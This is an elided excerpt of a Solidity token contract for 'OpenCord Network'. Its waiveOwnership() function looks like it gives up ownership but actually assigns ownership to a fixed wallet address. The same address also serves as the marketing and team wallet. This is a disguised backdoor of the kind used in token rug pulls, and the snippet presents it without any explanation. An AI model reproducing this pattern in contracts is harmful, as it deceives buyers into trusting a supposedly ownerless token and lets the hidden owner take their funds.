...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x746228E71b1a84818063C28983e9abfd14f591C2);
    }
...
contract OpenCord is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "OpenCord Network";
    string private _symbol = "OpenCord";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x746228E71b1a84818063C28983e9abfd14f591C2);
    address payable public teamWalletAddress = payable(0x746228E71b1a84818063C28983e9abfd14f591C2);
